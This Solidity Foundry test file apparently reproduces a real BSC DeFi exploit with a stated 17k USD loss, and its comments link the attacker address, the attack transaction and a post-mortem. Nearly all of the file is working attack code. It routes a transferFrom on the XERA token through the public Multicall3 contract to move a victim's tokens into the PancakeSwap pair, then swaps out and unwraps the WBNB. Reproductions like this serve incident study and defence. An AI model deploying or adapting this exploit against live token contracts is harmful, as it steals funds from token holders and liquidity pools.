// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 17k USD
// Attacker : https://bscscan.com/address/0x00b700b9da0053009cb84400ed1e8fe251002af3
// Attack Contract : N/A
// Vulnerable Contract : https://bscscan.com/address/0x90be00229fe8000000009e007743a485d400c3b7
// Attack Tx : https://bscscan.com/tx/0xed6fd61c1eb2858a1594616ddebaa414ad3b732dcdb26ac7833b46803c5c18db

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x90be00229fe8000000009e007743a485d400c3b7#code

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1958354933247590450
// Twitter Guy : https://x.com/TenArmorAlert/status/1958354933247590450
// Hacking God : N/A


contract Multicall is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 58269338 - 1;
    address constant multicall = 0xcA11bde05977b3631167028862bE2a173976CA11;
    address constant cakeLP = 0x231075E4AA60d28681a2d6D4989F8F739BAC15a0;
    address constant xera = 0x93E99aE6692b07A36E7693f4ae684c266633b67d;
    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;


    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //implement exploit code here

        bytes memory data = abi.encodeCall(
            IERC20.transferFrom,
            (
               0x9a619Ae8995A220E8f3A1Df7478A5c8d2afFc542,
                0x231075E4AA60d28681a2d6D4989F8F739BAC15a0,
                27900000000000000000000000  
            )
        );

        IMulticall.Call3 memory call = IMulticall.Call3({
            target: address(xera),
            allowFailure: false,
            callData: data
        });

        IMulticall.Call3[] memory calls = new IMulticall.Call3[](1);
        calls[0] = call;

        IMulticall(multicall).aggregate3(calls);


        IPancakePair(cakeLP).swap(0, 41034748173552867045, address(this), "");

        IERC20(wbnb).withdraw(41034748173552867045);

    }

    receive() external payable{}
}


interface IMulticall {
     function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData);

    
    struct Call3 {
        address target;
        bool allowFailure;
        bytes callData;
    }

    
    struct Result {
        bool success;
        bytes returnData;
    }
}